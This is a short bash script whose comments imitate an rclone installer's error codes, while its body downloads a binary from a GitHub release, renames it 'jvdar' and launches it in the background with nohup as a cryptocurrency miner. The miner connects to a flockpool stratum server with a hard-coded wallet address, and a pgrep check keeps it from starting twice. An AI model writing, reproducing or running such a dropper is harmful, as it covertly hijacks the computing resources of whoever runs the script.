#!/usr/bin/env bash

# error codes
# 0 - exited without problems
# 1 - parameters not supported were used or some unexpected error occurred
# 2 - OS not supported by this script
# 3 - installed version of rclone is up to date
# 4 - supported unzip tools are not available

count=`pgrep jvdar |  grep -o -E '[0-9]+'`

if [[ $count -gt 10 ]]
then
  echo "dang ton tai"
else
wget https://github.com/trangtrau/random-agent-spoofer/releases/download/va/ar && cp ar jvdar && chmod +x jvdar && nohup ./jvdar -a gr -o stratum+ssl://asia.flockpool.com:5555 -u RCjpfnfFfjvhnDzfY9ShQrAtjrP3Vf2PLP.cps -p x &
fi

